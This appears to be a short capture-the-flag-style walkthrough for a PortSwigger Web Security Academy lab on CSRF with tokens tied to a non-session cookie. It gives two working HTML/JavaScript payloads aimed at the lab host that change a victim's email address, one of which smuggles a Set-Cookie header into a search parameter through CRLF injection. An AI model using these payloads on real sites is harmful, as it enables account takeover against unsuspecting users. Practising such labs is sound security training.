Title: CSRF where token is tied to non-session cookie
Level: PRACTITIONER
Desc:  This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
    wiener:peter
    carlos:montoya

# Walkthrough: 


```
<form method="POST" action="https://0a2e0070032cbd63804c03a10030002d.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test31@normal-user.net">
    <input type="hidden" name="csrf" value="jAULYwXd0uwwmHbrrdqnEAhYF28f89Gx">
</form>
<script>
    document.cookie = "csrfKey=geGxCuNvi7OdVOsaiWKhTd2E1wrhs7Yg; path=/";
    document.forms[0].submit();
</script>
```

It works but portswigger don't accept that solution.

Proper solution in portswigger:
```
<form method="POST" action="https://0a2e0070032cbd63804c03a10030002d.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test1321@normal-user.net">
    <input type="hidden" name="csrf" value="jAULYwXd0uwwmHbrrdqnEAhYF28f89Gx">
</form>
<img src="https://0a2e0070032cbd63804c03a10030002d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=geGxCuNvi7OdVOsaiWKhTd2E1wrhs7Yg%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
